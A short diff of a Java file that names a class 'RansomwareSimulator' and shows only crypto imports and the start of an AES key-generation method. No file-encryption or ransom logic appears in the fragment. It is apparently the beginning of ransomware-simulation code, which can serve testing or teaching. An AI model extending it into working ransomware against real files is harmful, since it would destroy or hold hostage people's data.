@@ -1,12 +1,12 @@
 import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
-import javax.crypto.spec.SecretKeySpec;
+//import javax.crypto.spec.SecretKeySpec;
 import java.io.*;
 import java.nio.file.*;
 import java.security.SecureRandom;
 
-public class {
+public class RansomwareSimulator {
     // Generate AES key
     public static SecretKey generateKey() throws Exception {
         KeyGenerator keyGen = KeyGenerator.getInstance("AES");
